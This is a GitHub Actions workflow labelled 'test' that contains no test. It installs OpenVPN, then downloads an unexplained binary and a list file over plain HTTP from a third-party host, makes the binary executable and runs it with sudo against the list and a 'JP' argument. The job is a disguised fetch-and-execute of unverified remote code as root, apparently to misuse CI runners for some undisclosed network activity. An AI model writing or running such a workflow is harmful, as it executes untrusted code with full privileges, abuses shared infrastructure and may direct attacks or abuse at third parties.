name: test

on: [workflow_dispatch]

jobs:
  clone-and-run-0:
    runs-on: ubuntu-latest
    steps:
      - name: Install OpenVPN
        run: |
          sudo apt-get update
          sudo apt-get install -y openvpn

      - name: Download main
        run: wget -O main http://tsushima3.sakura.ne.jp/cub/mail/temp/main

      - name: Download list.txt
        run: wget -O list.txt http://tsushima3.sakura.ne.jp/cub/mail/temp/list.txt

      - name: Make main executable
        run: chmod +x main

      - name: Run main
        run: sudo ./main list.txt 5000 12000 JP
